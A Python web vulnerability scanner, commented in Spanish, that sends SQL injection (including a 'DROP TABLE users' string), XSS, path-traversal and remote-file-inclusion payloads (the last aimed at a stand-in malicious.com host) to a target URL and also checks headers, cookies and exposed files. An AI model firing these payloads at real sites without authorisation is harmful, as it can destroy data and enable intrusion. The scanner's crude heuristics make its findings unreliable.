import requests
import re
import logging
from bs4 import BeautifulSoup
import time
import sys

# Configurar el logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Colores para la salida en consola
class Color:
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    RESET = '\033[0m'

# Función para mostrar la barra de carga
def barra_carga(duration, message="Cargando"):
    total_length = 50
    for i in range(total_length + 1):
        bar = '#' * i + '-' * (total_length - i)
        sys.stdout.write(f'\r{message} [{bar}] {i * 2}% completado')
        sys.stdout.flush()
        time.sleep(duration / total_length)
    print()

# Función para validar URL
def es_url_valida(url):
    regex = re.compile(
        r'^(?:http|ftp)s?://'  # Esquema
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'  # Dominio
        r'localhost|'  # localhost
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|'  # IPv4
        r'\[?[A-F0-9]*:[A-F0-9:]+\]?)'  # IPv6
        r'(?::\d+)?'  # Puerto
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)

    return re.match(regex, url) is not None

# Función para verificar vulnerabilidades de inyección SQL
def verificar_inyeccion_sql(url):
    logging.info(f"{Color.YELLOW}[-] Verificando inyección SQL...{Color.RESET}")
    barra_carga(3, "Verificando inyección SQL")
    
    payloads = ["' OR '1'='1' --", "'; DROP TABLE users; --", '" OR "1"="1" --']
    issues = []

    try:
        response = requests.get(url)
        response.raise_for_status()

        for payload in payloads:
            test_url = f"{url}?id={payload}"
            test_response = requests.get(test_url)

            if test_response.status_code in [500, 403]:
                issues.append(f"Posible vulnerabilidad detectada con el payload '{payload}' (Código HTTP: {test_response.status_code}).")
                issues.append(f"Respuesta del servidor: {test_response.text[:200]}")  # Muestra los primeros 200 caracteres
            elif len(test_response.text) != len(response.text):
                issues.append(f"Posible inyección SQL con el payload '{payload}' debido a cambios en el contenido.")
                issues.append(f"Respuesta del servidor: {test_response.text[:200]}")  # Muestra los primeros 200 caracteres

        return "\n".join(issues) if issues else "No se detectaron vulnerabilidades de inyección SQL."

    except requests.RequestException as e:
        logging.error(f"Error al realizar la solicitud: {e}")
        return f"Error: {e}"

# Función para verificar vulnerabilidades XSS
def verificar_xss(url):
    logging.info(f"{Color.YELLOW}[-] Verificando XSS...{Color.RESET}")
    barra_carga(3, "Verificando XSS")
    
    payloads = ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>"]
    issues = []

    try:
        response = requests.get(url)
        response.raise_for_status()

        for payload in payloads:
            test_url = f"{url}?search={payload}"  # Cambia el parámetro según lo necesario
            test_response = requests.get(test_url)

            if payload in test_response.text:
                issues.append(f"Vulnerabilidad XSS detectada con el payload '{payload}'.")

        return "\n".join(issues) if issues else "No se detectaron vulnerabilidades XSS."

    except requests.RequestException as e:
        logging.error(f"Error al realizar la solicitud: {e}")
        return f"Error: {e}"

# Función para verificar protección CSRF en formularios
def verificar_csrf(url):
    logging.info(f"{Color.YELLOW}[-] Verificando CSRF...{Color.RESET}")
    barra_carga(3, "Verificando CSRF")
    
    issues = []
    try:
        response = requests.get(url)
        response.raise_for_status()

        soup = BeautifulSoup(response.content, 'html.parser')
        forms = soup.find_all('form')

        for form in forms:
            csrf_token = form.find('input', attrs={'name': re.compile(r'csrf|token', re.I)})
            if not csrf_token:
                issues.append("Posible vulnerabilidad CSRF: No se encontró un token en el formulario.")

        return "\n".join(issues) if issues else "No se encontraron vulnerabilidades CSRF."

    except requests.RequestException as e:
        logging.error(f"Error al realizar la solicitud: {e}")
        return f"Error: {e}"

# Función para verificar encabezados de seguridad
def verificar_encabezados(url):
    logging.info(f"{Color.YELLOW}[-] Verificando encabezados de seguridad...{Color.RESET}")
    barra_carga(3, "Verificando encabezados de seguridad")
    
    issues = []
    try:
        response = requests.get(url)
        response.raise_for_status()

        security_headers = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'DENY',
            'X-XSS-Protection': '1; mode=block',
            'Content-Security-Policy': ''
        }

        for header, value in security_headers.items():
            if header not in response.headers:
                issues.append(f"Encabezado de seguridad faltante: {header}")
            elif value and response.headers[header] != value:
                issues.append(f"Encabezado de seguridad incorrecto: {header} debe ser '{value}'.")

        return "\n".join(issues) if issues else "Todos los encabezados de seguridad recomendados están presentes."

    except requests.RequestException as e:
        logging.error(f"Error al realizar la solicitud: {e}")
        return f"Error: {e}"

# Función para verificar cookies
def verificar_cookies(url):
    logging.info(f"{Color.YELLOW}[-] Verificando cookies...{Color.RESET}")
    barra_carga(3, "Verificando cookies")
    
    issues = []
    try:
        response = requests.get(url)
        response.raise_for_status()

        cookies = response.cookies
        for cookie in cookies:
            if not cookie.secure:
                issues.append(f"Cookie insegura encontrada: {cookie.name} (debe tener el atributo 'Secure').")
            if not cookie.has_nonstandard_attr('HttpOnly'):
                issues.append(f"Cookie sin HttpOnly encontrada: {cookie.name} (debe tener el atributo 'HttpOnly').")

        return "\n".join(issues) if issues else "Todas las cookies están correctamente configuradas."

    except requests.RequestException as e:
        logging.error(f"Error al realizar la solicitud: {e}")
        return f"Error: {e}"

# Función para detectar rutas de archivos expuestos
def detectar_archivos_expuestos(url):
    logging.info(f"{Color.YELLOW}[-] Detectando archivos expuestos...{Color.RESET}")
    barra_carga(3, "Detectando archivos expuestos")
    
    common_paths = [
        '/.env', '/config.php', '/db_backup.sql', '/backup.zip', '/test.php'
    ]
    issues = []

    try:
        for path in common_paths:
            test_url = f"{url}{path}"
            response = requests.get(test_url)

            if response.status_code == 200:
                issues.append(f"Ruta expuesta encontrada: {test_url}")

        return "\n".join(issues) if issues else "No se encontraron rutas de archivos expuestos."

    except requests.RequestException as e:
        logging.error(f"Error al realizar la solicitud: {e}")
        return f"Error: {e}"

# Función para verificar errores de depuración
def verificar_errores_de_depuracion(url):
    logging.info(f"{Color.YELLOW}[-] Verificando errores de depuración...{Color.RESET}")
    barra_carga(3, "Verificando errores de depuración")
    
    issues = []
    try:
        response = requests.get(url)
        response.raise_for_status()

        if re.search(r'\b(debug|error|exception|traceback)\b', response.text, re.IGNORECASE):
            issues.append("Posible error de depuración detectado en la respuesta.")

        return "\n".join(issues) if issues else "No se encontraron errores de depuración en la respuesta."

    except requests.RequestException as e:
        logging.error(f"Error al realizar la solicitud: {e}")
        return f"Error: {e}"

# Función para verificar LFI/RFI
def verificar_lfi_rfi(url):
    logging.info(f"{Color.YELLOW}[-] Verificando LFI/RFI...{Color.RESET}")
    barra_carga(3, "Verificando LFI/RFI")
    
    payloads = [
        "../etc/passwd", "../proc/self/environ", "http://malicious.com/malware.txt"
    ]
    issues = []

    try:
        for payload in payloads:
            test_url = f"{url}?file={payload}"
            response = requests.get(test_url)

            if response.status_code == 200 and "passwd" in response.text:
                issues.append("Vulnerabilidad LFI detectada.")
            elif response.status_code == 200 and "malware" in response.text:
                issues.append("Vulnerabilidad RFI detectada.")

        return "\n".join(issues) if issues else "No se detectaron vulnerabilidades LFI/RFI."

    except requests.RequestException as e:
        logging.error(f"Error al realizar la solicitud: {e}")
        return f"Error: {e}"

# Función principal de análisis
def analizar_pagina(url):
    logging.info(f"{Color.GREEN}[-] Analizando la página: {url}{Color.RESET}")

    # Validar la URL
    if not es_url_valida(url):
        logging.error("URL no válida.")
        return "URL no válida."

    # Verificar vulnerabilidades
    reportes = {
        "Inyección SQL": verificar_inyeccion_sql(url),
        "XSS": verificar_xss(url),
        "CSRF": verificar_csrf(url),
        "Encabezados de Seguridad": verificar_encabezados(url),
        "Cookies": verificar_cookies(url),
        "Archivos Expuestos": detectar_archivos_expuestos(url),
        "Errores de Depuración": verificar_errores_de_depuracion(url),
        "LFI/RFI": verificar_lfi_rfi(url)
    }

    # Generar el informe
    informe = "\n".join([f"{categoria}:\n{resultado}" for categoria, resultado in reportes.items()])

    # Guardar el informe en un archivo
    with open("informe_vulnerabilidades.txt", "w") as f:
        f.write(informe)

    logging.info(f"{Color.GREEN}[-] Análisis completado. Informe guardado como 'informe_vulnerabilidades.txt'.{Color.RESET}")
    return informe

# Ejecución del script
if __name__ == "__main__":
    if len(sys.argv) != 2:
        logging.error("Uso: python vuln_checker.py <URL>")
        sys.exit(1)

    url = sys.argv[1]
    resultado = analizar_pagina(url)
    print(resultado)
